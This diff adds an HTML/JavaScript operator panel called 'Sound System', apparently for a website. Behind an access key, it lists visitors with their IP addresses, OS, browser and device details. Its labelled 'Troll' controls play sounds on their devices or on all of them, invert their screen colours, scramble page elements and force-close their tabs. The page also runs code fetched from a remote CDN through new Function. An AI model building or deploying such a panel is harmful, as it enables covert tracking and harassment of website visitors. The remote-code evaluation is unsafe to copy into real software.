@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sound System</title>
+<link rel="icon" href="/img/voidnetwork.png" type="image/x-icon">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#e0e0e0;font-family:'Poppins',sans-serif;min-height:100vh}
+.view{display:none;padding:2rem;max-width:1400px;margin:0 auto}.view.active{display:block}
+.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:2rem}
+.login-card{background:rgba(20,20,20,0.8);border:1px solid rgba(255,255,255,0.08);border-radius:20px;padding:2.5rem;max-width:380px;width:100%;text-align:center;backdrop-filter:blur(20px)}
+.login-card h1{font-size:1.3rem;font-weight:600;margin-bottom:1.5rem;color:#fff}
+.login-card input{width:100%;padding:.85rem 1rem;background:rgba(30,30,30,0.8);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;font-family:inherit;font-size:.9rem;outline:none;transition:border-color .3s}
+.login-card input:focus{border-color:rgba(255,255,255,0.25)}.login-card input::placeholder{color:rgba(255,255,255,0.3)}
+.login-card button{width:100%;padding:.85rem;margin-top:1rem;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:12px;color:#fff;font-family:inherit;font-size:.9rem;font-weight:500;cursor:pointer;transition:all .3s}
+.login-card button:hover{background:rgba(255,255,255,0.14)}
+.login-err{color:#ff6b6b;font-size:.8rem;margin-top:.75rem;display:none}
+.hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.5rem;padding-bottom:1rem;border-bottom:1px solid rgba(255,255,255,0.06);flex-wrap:wrap;gap:.5rem}
+.hdr h1{font-size:1.4rem;font-weight:600}.hdr .stats{font-size:.8rem;color:rgba(255,255,255,0.5)}
+.back-btn,.refresh-btn{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);color:#fff;padding:.5rem 1rem;border-radius:10px;font-family:inherit;font-size:.8rem;cursor:pointer;transition:all .3s}
+.back-btn:hover,.refresh-btn:hover{background:rgba(255,255,255,0.12)}
+.refresh-btn{background:rgba(76,175,80,0.08);border-color:rgba(76,175,80,0.2);color:#81c784}
+.refresh-btn:hover{background:rgba(76,175,80,0.15)}
+.logout-btn{background:rgba(255,60,60,0.08);border:1px solid rgba(255,60,60,0.2);color:#ff6b6b;padding:.5rem 1rem;border-radius:10px;font-family:inherit;font-size:.8rem;cursor:pointer;transition:all .3s}
+.logout-btn:hover{background:rgba(255,60,60,0.15)}
+.toolbar{display:flex;gap:.75rem;margin-bottom:1.5rem;flex-wrap:wrap;align-items:stretch}
+.toolbar input{flex:1;min-width:160px;padding:.75rem 1rem;background:rgba(20,20,20,0.8);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;font-family:inherit;font-size:.85rem;outline:none}
+.toolbar input::placeholder{color:rgba(255,255,255,0.3)}
+.toolbar button{padding:.75rem 1.2rem;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:12px;color:#fff;font-family:inherit;cursor:pointer;transition:all .3s;font-size:.82rem;white-space:nowrap}
+.toolbar button:hover{background:rgba(255,255,255,0.14)}
+.toolbar .clear-btn{background:rgba(255,100,100,0.08);border-color:rgba(255,100,100,0.2);color:#ff8a8a}
+.toolbar .clear-btn:hover{background:rgba(255,100,100,0.15)}
+.toolbar .troll-btn{background:rgba(168,85,247,0.1);border-color:rgba(168,85,247,0.3);color:#c084fc}
+.toolbar .troll-btn:hover{background:rgba(168,85,247,0.2)}
+.summary{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin-bottom:2rem}
+.summary-card{background:rgba(20,20,20,0.7);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:1.25rem;text-align:center}
+.summary-card .num{font-size:2rem;font-weight:700;background:linear-gradient(135deg,#fff,#888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.summary-card .label{font-size:.75rem;color:rgba(255,255,255,0.4);margin-top:.25rem}
+.user-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1rem}
+.user-card{background:rgba(20,20,20,0.7);border:1px solid rgba(255,255,255,0.08);border-radius:14px;padding:1.25rem;cursor:pointer;transition:all .3s;position:relative}
+.user-card:hover{border-color:rgba(255,255,255,0.2);transform:translateY(-1px)}
+.user-card .uid{font-size:1.1rem;font-weight:600;font-family:'Courier New',monospace;letter-spacing:2px;margin-bottom:.5rem;color:#fff}
+.user-card .info{font-size:.8rem;color:rgba(255,255,255,0.5);line-height:1.7}
+.user-card .status{position:absolute;top:1rem;right:1rem;width:10px;height:10px;border-radius:50%;background:#4caf50}
+.user-card .status.no-audio{background:#ff9800}
+.user-card .status.offline{background:#666}
+.user-card .actions{display:flex;gap:.5rem;margin-top:.75rem}
+.user-card .actions button{flex:1;padding:.4rem;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#fff;font-family:inherit;font-size:.7rem;cursor:pointer;transition:all .2s}
+.user-card .actions button:hover{background:rgba(255,255,255,0.12)}
+.user-card .actions .kick-btn{background:rgba(255,60,60,0.08);border-color:rgba(255,60,60,0.2);color:#ff6b6b}
+.user-card .actions .kick-btn:hover{background:rgba(255,60,60,0.15)}
+.user-card .actions .troll-btn{background:rgba(168,85,247,0.08);border-color:rgba(168,85,247,0.2);color:#c084fc}
+.user-card .actions .troll-btn:hover{background:rgba(168,85,247,0.15)}
+.play-all-card{background:rgba(76,175,80,0.08);border:1px solid rgba(76,175,80,0.2);text-align:center;padding:1.5rem}
+.play-all-card:hover{border-color:rgba(76,175,80,0.4)}
+.play-all-card .uid{font-size:1.2rem}
+.sb-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:10000;overflow-y:auto;padding:2rem}
+.sb-overlay.active{display:block}
+.sb-container{max-width:1000px;margin:0 auto}
+.sb-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.5rem;flex-wrap:wrap;gap:.75rem}
+.sb-header h2{font-size:1.2rem;font-weight:600}
+.sb-target{font-size:.85rem;color:rgba(255,255,255,0.5)}
+.sb-target span{color:#fff;font-weight:600;font-family:monospace}
+.sb-controls{display:flex;gap:.75rem;margin-bottom:1rem;flex-wrap:wrap;align-items:center}
+.sb-controls input[type=text]{flex:1;min-width:200px;padding:.65rem 1rem;background:rgba(20,20,20,0.9);border:1px solid rgba(255,255,255,0.1);border-radius:10px;color:#fff;font-family:inherit;font-size:.85rem;outline:none}
+.sb-controls input[type=text]::placeholder{color:rgba(255,255,255,0.3)}
+.sb-controls label{font-size:.8rem;color:rgba(255,255,255,0.5);display:flex;align-items:center;gap:.5rem}
+.sb-controls input[type=range]{width:100px;accent-color:#fff}
+.sb-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:.6rem}
+.sb-btn{background:rgba(25,25,25,0.9);border:1px solid rgba(255,255,255,0.08);border-radius:10px;padding:.7rem .5rem;text-align:center;cursor:pointer;transition:all .2s;font-size:.72rem;color:rgba(255,255,255,0.8);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.sb-btn:hover{border-color:rgba(255,255,255,0.25);background:rgba(40,40,40,0.9)}
+.sb-btn:active{transform:scale(.97)}
+.sb-btn.playing{border-color:rgba(76,175,80,0.5);background:rgba(76,175,80,0.1)}
+.no-results{text-align:center;padding:3rem;color:rgba(255,255,255,0.3);font-size:.9rem}
+.sb-count{font-size:.8rem;color:rgba(255,255,255,0.4)}
+.troll-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:10001;overflow-y:auto;padding:2rem}
+.troll-overlay.active{display:block}
+.troll-container{max-width:500px;margin:3rem auto}
+.troll-card{background:rgba(20,20,20,0.9);border:1px solid rgba(255,255,255,0.08);border-radius:16px;padding:2rem}
+.troll-card h2{font-size:1.1rem;font-weight:600;margin-bottom:.25rem}
+.troll-card .troll-uid{font-family:monospace;font-size:1.3rem;font-weight:700;letter-spacing:2px;color:#c084fc;margin-bottom:1.5rem}
+.troll-actions{display:flex;flex-direction:column;gap:.75rem}
+.troll-action-btn{display:flex;align-items:center;justify-content:space-between;padding:1rem 1.25rem;background:rgba(30,30,30,0.8);border:1px solid rgba(255,255,255,0.08);border-radius:12px;cursor:pointer;transition:all .2s}
+.troll-action-btn:hover{border-color:rgba(255,255,255,0.2);background:rgba(40,40,40,0.8)}
+.troll-action-btn .ta-label{font-size:.9rem;font-weight:500}
+.troll-action-btn .ta-desc{font-size:.7rem;color:rgba(255,255,255,0.4);margin-top:.15rem}
+.troll-action-btn .ta-toggle{width:44px;height:24px;border-radius:12px;background:rgba(255,255,255,0.1);position:relative;flex-shrink:0;transition:background .3s}
+.troll-action-btn .ta-toggle.on{background:rgba(76,175,80,0.5)}
+.troll-action-btn .ta-toggle::after{content:'';position:absolute;top:3px;left:3px;width:18px;height:18px;border-radius:50%;background:#fff;transition:transform .3s}
+.troll-action-btn .ta-toggle.on::after{transform:translateX(20px)}
+.troll-action-btn.danger{border-color:rgba(255,60,60,0.15)}
+.troll-action-btn.danger:hover{border-color:rgba(255,60,60,0.3);background:rgba(255,60,60,0.05)}
+.troll-action-btn.sound-action{border-color:rgba(76,175,80,0.15)}
+.troll-action-btn.sound-action:hover{border-color:rgba(76,175,80,0.3);background:rgba(76,175,80,0.05)}
+</style>
+</head>
+<body>
+
+<div id="v-login" class="view active">
+  <div class="login-wrap">
+    <div class="login-card">
+      <h1>Sound System</h1>
+      <input type="password" id="pw" placeholder="Access key" autocomplete="off">
+      <button id="loginBtn">Authenticate</button>
+      <div class="login-err" id="lerr"></div>
+    </div>
+  </div>
+</div>
+
+<div id="v-main" class="view">
+  <div class="hdr">
+    <h1>Sound System</h1>
+    <div style="display:flex;gap:.5rem;align-items:center">
+      <div class="stats" id="statsText">-</div>
+      <button class="refresh-btn" id="refreshBtn">Refresh</button>
+      <button class="logout-btn" id="logoutBtn">Logout</button>
+    </div>
+  </div>
+
+  <div class="toolbar">
+    <input type="text" id="ipFilter" placeholder="Filter by IP...">
+    <button id="filterBtn">Filter IP</button>
+    <button class="clear-btn" id="clearBtn">Clear</button>
+    <input type="text" id="uidInput" placeholder="Troll by UID..." maxlength="9" style="max-width:180px;text-transform:uppercase;font-family:monospace;letter-spacing:2px">
+    <button class="troll-btn" id="trollUidBtn">Troll UID</button>
+  </div>
+
+  <div class="summary">
+    <div class="summary-card"><div class="num" id="totalCount">-</div><div class="label">Total Users</div></div>
+    <div class="summary-card"><div class="num" id="onlineCount">-</div><div class="label">Online</div></div>
+    <div class="summary-card"><div class="num" id="audioCount">-</div><div class="label">Audio Ready</div></div>
+    <div class="summary-card"><div class="num" id="ipCount">-</div><div class="label">Unique IPs</div></div>
+  </div>
+
+  <div class="user-grid" id="userGrid">
+    <div class="no-results">Press Refresh to load users</div>
+  </div>
+</div>
+
+<div class="sb-overlay" id="sbOverlay">
+  <div class="sb-container">
+    <div class="sb-header">
+      <div>
+        <h2>Soundboard</h2>
+        <div class="sb-target">Target: <span id="sbTarget">-</span></div>
+      </div>
+      <button class="back-btn" id="sbCloseBtn">Close</button>
+    </div>
+    <div class="sb-controls">
+      <input type="text" id="soundSearch" placeholder="Search sounds...">
+      <label>Vol <input type="range" id="volSlider" min="0" max="100" value="100"></label>
+      <div class="sb-count" id="soundCount">-</div>
+    </div>
+    <div class="sb-grid" id="soundGrid"></div>
+  </div>
+</div>
+
+<div class="troll-overlay" id="trollOverlay">
+  <div class="troll-container">
+    <div class="troll-card">
+      <div style="display:flex;justify-content:space-between;align-items:start;margin-bottom:1rem">
+        <div>
+          <h2>Troll User</h2>
+          <div class="troll-uid" id="trollTargetUid">-</div>
+        </div>
+        <button class="back-btn" id="trollCloseBtn">Close</button>
+      </div>
+      <div class="troll-actions">
+        <div class="troll-action-btn sound-action" id="trollSoundBtn">
+          <div>
+            <div class="ta-label">Soundboard</div>
+            <div class="ta-desc">Play sounds on their device</div>
+          </div>
+          <div style="font-size:1.2rem">&#9654;</div>
+        </div>
+        <div class="troll-action-btn" id="trollInvertBtn">
+          <div>
+            <div class="ta-label">Invert Colors</div>
+            <div class="ta-desc">Flip their screen colors</div>
+          </div>
+          <div class="ta-toggle" id="invertToggle"></div>
+        </div>
+        <div class="troll-action-btn" id="trollGravityBtn">
+          <div>
+            <div class="ta-label">Disable Gravity</div>
+            <div class="ta-desc">Elements fly around chaotically</div>
+          </div>
+          <div class="ta-toggle" id="gravityToggle"></div>
+        </div>
+        <div class="troll-action-btn danger" id="trollKickBtn">
+          <div>
+            <div class="ta-label" style="color:#ff6b6b">Kick User</div>
+            <div class="ta-desc">Force close their tab</div>
+          </div>
+          <div style="font-size:1.2rem;color:#ff6b6b">&#10005;</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  var token = null;
+  var sounds = [];
+  var currentTarget = null;
+  var trollTarget = null;
+  var currentIpFilter = '';
+  var CDN = 'https://cdn.jsdelivr.net/gh/genizy/soundboard@main';
+
+  function esc(s) { return s ? String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') : ''; }
+
+  function show(id) {
+    document.querySelectorAll('.view').forEach(function(v) { v.classList.remove('active'); });
+    document.getElementById(id).classList.add('active');
+  }
+
+  async function api(path, opts) {
+    opts = opts || {};
+    opts.headers = Object.assign({ 'Authorization': 'Bearer ' + token }, opts.headers || {});
+    var r = await fetch('/api/soundsys' + path, opts);
+    if (r.status === 401) { logout(); throw new Error('unauthorized'); }
+    return r.json();
+  }
+
+  // Login
+  document.getElementById('loginBtn').addEventListener('click', doLogin);
+  document.getElementById('pw').addEventListener('keydown', function(e) { if (e.key === 'Enter') doLogin(); });
+
+  async function doLogin() {
+    var pw = document.getElementById('pw').value;
+    var err = document.getElementById('lerr');
+    err.style.display = 'none';
+    try {
+      var r = await fetch('/api/soundsys/auth', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ password: pw })
+      });
+      var d = await r.json();
+      if (d.success) {
+        token = d.token;
+        sessionStorage.setItem('_ss_tk', token);
+        show('v-main');
+      } else {
+        err.textContent = d.error || 'Invalid password';
+        err.style.display = 'block';
+      }
+    } catch (x) {
+      err.textContent = 'Connection error';
+      err.style.display = 'block';
+    }
+  }
+
+  function logout() {
+    token = null;
+    sessionStorage.removeItem('_ss_tk');
+    show('v-login');
+    document.getElementById('pw').value = '';
+  }
+
+  document.getElementById('logoutBtn').addEventListener('click', logout);
+
+  var stored = sessionStorage.getItem('_ss_tk');
+  if (stored) {
+    token = stored;
+    show('v-main');
+  }
+
+  // Manual refresh only
+  document.getElementById('refreshBtn').addEventListener('click', function() {
+    this.textContent = 'Loading...';
+    this.disabled = true;
+    loadUsers().finally(function() {
+      document.getElementById('refreshBtn').textContent = 'Refresh';
+      document.getElementById('refreshBtn').disabled = false;
+    });
+  });
+
+  // Filter
+  document.getElementById('filterBtn').addEventListener('click', function() {
+    currentIpFilter = document.getElementById('ipFilter').value.trim();
+    loadUsers();
+  });
+  document.getElementById('clearBtn').addEventListener('click', function() {
+    currentIpFilter = '';
+    document.getElementById('ipFilter').value = '';
+    loadUsers();
+  });
+  document.getElementById('ipFilter').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') { currentIpFilter = this.value.trim(); loadUsers(); }
+  });
+
+  // Troll by UID
+  document.getElementById('trollUidBtn').addEventListener('click', function() {
+    var uid = document.getElementById('uidInput').value.trim().toUpperCase();
+    if (!uid) return;
+    openTrollPanel(uid);
+  });
+  document.getElementById('uidInput').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      var uid = this.value.trim().toUpperCase();
+      if (uid) openTrollPanel(uid);
+    }
+  });
+
+  async function loadUsers() {
+    try {
+      var url = '/users';
+      if (currentIpFilter) url += '?ip=' + encodeURIComponent(currentIpFilter);
+      var d = await api(url);
+      var users = d.users || [];
+
+      var online = users.filter(function(u) { return u.connected; });
+      var audioReady = users.filter(function(u) { return u.audioReady && u.connected; });
+      var ips = new Set(users.map(function(u) { return u.ip; }));
+
+      document.getElementById('totalCount').textContent = users.length;
+      document.getElementById('onlineCount').textContent = online.length;
+      document.getElementById('audioCount').textContent = audioReady.length;
+      document.getElementById('ipCount').textContent = ips.size;
+      document.getElementById('statsText').textContent = users.length + ' total, ' + online.length + ' online';
+
+      renderUsers(users);
+    } catch (e) {}
+  }
+
+  function renderUsers(users) {
+    var grid = document.getElementById('userGrid');
+
+    users.sort(function(a, b) {
+      if (a.connected !== b.connected) return b.connected ? 1 : -1;
+      return (b.lastSeen || 0) - (a.lastSeen || 0);
+    });
+
+    grid.innerHTML = '';
+
+    // Play All card
+    var allCard = document.createElement('div');
+    allCard.className = 'user-card play-all-card';
+    allCard.innerHTML = '<div class="uid">PLAY ON ALL DEVICES</div><div class="info">Send sound to every connected user</div>';
+    allCard.addEventListener('click', function() { openSoundboard('all', '', ''); });
+    grid.appendChild(allCard);
+
+    if (!users.length) {
+      var nr = document.createElement('div');
+      nr.className = 'no-results';
+      nr.textContent = 'No users found' + (currentIpFilter ? ' for IP: ' + currentIpFilter : '');
+      grid.appendChild(nr);
+      return;
+    }
+
+    users.forEach(function(u) {
+      var card = document.createElement('div');
+      card.className = 'user-card';
+      var statusClass = !u.connected ? 'status offline' : (u.audioReady ? 'status' : 'status no-audio');
+      var ago = u.lastSeen ? timeSince(u.lastSeen) : '?';
+
+      card.innerHTML = '<div class="' + statusClass + '"></div>'
+        + '<div class="uid">' + esc(u.uid) + '</div>'
+        + '<div class="info">'
+        + esc(u.os || 'Unknown') + ' &mdash; ' + esc(u.browser || 'Unknown') + '<br>'
+        + 'IP: ' + esc(u.ip || '?') + '<br>'
+        + 'Screen: ' + esc(u.screen || '?') + ' &bull; ' + esc(u.deviceType || '?') + '<br>'
+        + (u.audioReady ? '&#10004; Audio' : '&#10008; No Audio') + ' &bull; ' + ago
+        + '</div>'
+        + '<div class="actions">'
+        + '<button class="sound-btn">Soundboard</button>'
+        + '<button class="troll-btn">Troll</button>'
+        + '<button class="kick-btn">Kick</button>'
+        + '</div>';
+
+      card.querySelector('.sound-btn').addEventListener('click', function(e) {
+        e.stopPropagation();
+        openSoundboard(u.uid, u.os || '', u.ip || '');
+      });
+      card.querySelector('.troll-btn').addEventListener('click', function(e) {
+        e.stopPropagation();
+        openTrollPanel(u.uid);
+      });
+      card.querySelector('.kick-btn').addEventListener('click', function(e) {
+        e.stopPropagation();
+        if (confirm('Kick user ' + u.uid + '?')) kickUser(u.uid);
+      });
+      card.addEventListener('click', function() { openSoundboard(u.uid, u.os || '', u.ip || ''); });
+
+      grid.appendChild(card);
+    });
+  }
+
+  function timeSince(ts) {
+    var s = Math.floor((Date.now() - ts) / 1000);
+    if (s < 10) return 'just now';
+    if (s < 60) return s + 's ago';
+    if (s < 3600) return Math.floor(s / 60) + 'm ago';
+    return Math.floor(s / 3600) + 'h ago';
+  }
+
+  async function kickUser(uid) {
+    try { await api('/kick', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ uid: uid }) }); } catch (e) {}
+  }
+
+  // Troll Panel
+  function openTrollPanel(uid) {
+    trollTarget = uid;
+    document.getElementById('trollTargetUid').textContent = uid;
+    document.getElementById('trollOverlay').classList.add('active');
+    loadTrollState(uid);
+  }
+
+  async function loadTrollState(uid) {
+    try {
+      var r = await fetch('/api/uid/data?uid=' + encodeURIComponent(uid));
+      var data = await r.json();
+      document.getElementById('invertToggle').classList.toggle('on', !!data.invertColors);
+      document.getElementById('gravityToggle').classList.toggle('on', data.gravityOn === false);
+    } catch (e) {
+      document.getElementById('invertToggle').classList.remove('on');
+      document.getElementById('gravityToggle').classList.remove('on');
+    }
+  }
+
+  document.getElementById('trollCloseBtn').addEventListener('click', function() {
+    document.getElementById('trollOverlay').classList.remove('active');
+    trollTarget = null;
+  });
+
+  document.getElementById('trollSoundBtn').addEventListener('click', function() {
+    if (!trollTarget) return;
+    document.getElementById('trollOverlay').classList.remove('active');
+    openSoundboard(trollTarget, '', '');
+  });
+
+  document.getElementById('trollInvertBtn').addEventListener('click', function() {
+    if (!trollTarget) return;
+    var tog = document.getElementById('invertToggle');
+    var newVal = !tog.classList.contains('on');
+    tog.classList.toggle('on', newVal);
+    var updates = { invertColors: newVal };
+    if (newVal) updates.invertStartTime = Date.now();
+    else updates.invertStartTime = null;
+    // Single request: saves state + queues command instantly
+    api('/troll', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid: trollTarget, updates: updates })
+    }).catch(function() {});
+  });
+
+  document.getElementById('trollGravityBtn').addEventListener('click', function() {
+    if (!trollTarget) return;
+    var tog = document.getElementById('gravityToggle');
+    var newVal = !tog.classList.contains('on');
+    tog.classList.toggle('on', newVal);
+    var updates = { gravityOn: !newVal };
+    if (newVal) updates.gravityOffStartTime = Date.now();
+    else updates.gravityOffStartTime = null;
+    // Single request: saves state + queues command instantly
+    api('/troll', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid: trollTarget, updates: updates })
+    }).catch(function() {});
+  });
+
+  document.getElementById('trollKickBtn').addEventListener('click', function() {
+    if (!trollTarget) return;
+    if (confirm('Kick user ' + trollTarget + '?')) {
+      kickUser(trollTarget);
+      document.getElementById('trollOverlay').classList.remove('active');
+      trollTarget = null;
+    }
+  });
+
+  // Soundboard
+  function openSoundboard(uid, os, ip) {
+    currentTarget = { uid: uid, os: os, ip: ip };
+    var label = uid === 'all' ? 'ALL DEVICES' : uid;
+    document.getElementById('sbTarget').textContent = label + (ip ? ' (IP: ' + ip + ')' : '');
+    document.getElementById('sbOverlay').classList.add('active');
+    if (!sounds.length) loadSounds();
+    else renderSounds();
+  }
+
+  document.getElementById('sbCloseBtn').addEventListener('click', function() {
+    document.getElementById('sbOverlay').classList.remove('active');
+    currentTarget = null;
+  });
+
+  document.getElementById('soundSearch').addEventListener('input', renderSounds);
+
+  async function loadSounds() {
+    document.getElementById('soundGrid').innerHTML = '<div class="no-results">Loading sounds...</div>';
+    try {
+      var r = await fetch(CDN + '/sounds.js');
+      var t = await r.text();
+      var m = t.match(/\[\s*\{[\s\S]*\}\s*\]/);
+      if (m) {
+        try { sounds = (new Function('return ' + m[0]))(); } catch (e) { sounds = []; }
+      } else { sounds = []; }
+      if (!Array.isArray(sounds)) sounds = [];
+      document.getElementById('soundCount').textContent = sounds.length + ' sounds';
+      renderSounds();
+    } catch (e) {
+      document.getElementById('soundGrid').innerHTML = '<div class="no-results">Failed to load sounds</div>';
+    }
+  }
+
+  function renderSounds() {
+    var grid = document.getElementById('soundGrid');
+    var q = (document.getElementById('soundSearch').value || '').toLowerCase();
+    var filtered = q ? sounds.filter(function(s) { return s.name.toLowerCase().includes(q); }) : sounds;
+    document.getElementById('soundCount').textContent = filtered.length + (q ? ' matched' : ' sounds');
+    grid.innerHTML = '';
+    filtered.slice(0, 500).forEach(function(s) {
+      var btn = document.createElement('div');
+      btn.className = 'sb-btn';
+      btn.textContent = s.name;
+      btn.title = s.name;
+      btn.addEventListener('click', function() { playSound(s, btn); });
+      grid.appendChild(btn);
+    });
+    if (!filtered.length) grid.innerHTML = '<div class="no-results">No sounds match</div>';
+  }
+
+  async function playSound(s, btn) {
+    if (!currentTarget) return;
+    var vol = parseInt(document.getElementById('volSlider').value) / 100;
+    var url = CDN + s.mp3;
+    try {
+      btn.classList.add('playing');
+      await api('/play', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uid: currentTarget.uid, soundUrl: url, volume: vol })
+      });
+      setTimeout(function() { btn.classList.remove('playing'); }, 1500);
+    } catch (e) { btn.classList.remove('playing'); }
+  }
+
+  // Close overlays on Escape
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+      if (document.getElementById('sbOverlay').classList.contains('active')) {
+        document.getElementById('sbOverlay').classList.remove('active');
+        currentTarget = null;
+      } else if (document.getElementById('trollOverlay').classList.contains('active')) {
+        document.getElementById('trollOverlay').classList.remove('active');
+        trollTarget = null;
+      }
+    }
+  });
+})();
+</script>
+<script src="/assets/js/wilway-popup.js" defer></script>
+</body>
+</html>
